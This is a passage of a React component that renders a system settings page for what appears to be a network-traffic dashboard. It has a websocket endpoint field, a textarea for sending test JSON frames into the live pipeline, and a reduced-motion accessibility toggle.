              <h1 className="text-2xl font-bold tracking-tight">
                System Settings
              </h1>
            </div>

            <div className="bg-[#141416] border border-[#27272A] p-5 space-y-4 font-mono text-xs">
              <div className="font-bold uppercase border-b border-[#27272A] pb-2 text-[#F1EFE9]">
                1. BACKEND WEBSOCKET STREAM & OPERATING MODE
              </div>
              <div className="space-y-2">
                <label className="block text-[10px] text-[#9A9891]">
                  WEBSOCKET ENDPOINT URI
                </label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={wsEndpoint}
                    onChange={(e) => setWsEndpoint(e.target.value)}
                    className="flex-1 px-3 py-2 bg-[#0B0B0C] border border-[#27272A] text-[#F1EFE9] text-xs"
                  />
                  <button
                    onClick={initiateLiveConnection}
                    className="px-4 py-2 bg-[#F1EFE9] text-[#0B0B0C] hover:bg-[#FF493D] font-bold uppercase"
                  >
                    CONNECT LIVE STREAM
                  </button>
                </div>
              </div>

              <div className="space-y-2 pt-2 border-t border-[#27272A]">
                <label className="block text-[10px] text-[#9A9891]">
                  TEST LIVE WEBSOCKET FRAME INGESTION (JSON)
                </label>
                <textarea
                  rows={3}
                  value={customWsPayload}
                  onChange={(e) => setCustomWsPayload(e.target.value)}
                  className="w-full p-2.5 bg-[#080809] text-[#F1EFE9] border border-[#27272A] text-[11px]"
                />
                <button
                  onClick={injectTestLiveFrame}
                  className="px-4 py-2 bg-[#FF493D] text-[#0B0B0C] font-bold uppercase flex items-center gap-1.5"
                >
                  <Send size={12} /> INJECT FRAME INTO LIVE PIPELINE
                </button>
              </div>
            </div>

            <div className="bg-[#141416] border border-[#27272A] p-5 space-y-3 font-mono text-xs">
              <div className="font-bold uppercase border-b border-[#27272A] pb-2 text-[#F1EFE9]">
                2. ACCESSIBILITY & MOTION PREFERENCES
              </div>
              <div className="flex items-center justify-between">
                <div>
                  <div className="font-bold text-[#F1EFE9]">REDUCED MOTION MODE</div>
                  <div className="font-sans text-xs text-[#9A9891]">
                    Disables pulsing rings, moving network traffic particles, and animated number
                    counters.
                  </div>
                </div>
                <button
                  onClick={() => setReducedMotion(!reducedMotion)}
                  className={cn(
                    'px-4 py-2 border font-bold uppercase',
                    reducedMotion
                      ? 'bg-[#FF493D] text-[#0B0B0C] border-[#FF493D]'
                      : 'bg-[#0B0B0C] text-[#F1EFE9] border-[#27272A]'
                  )}
                >
                  {reducedMotion ? 'ENABLED' : 'DISABLED'}
                </button>
              </div>
            </div>
          </main>
        )}
      </div>
    </div>
  );
}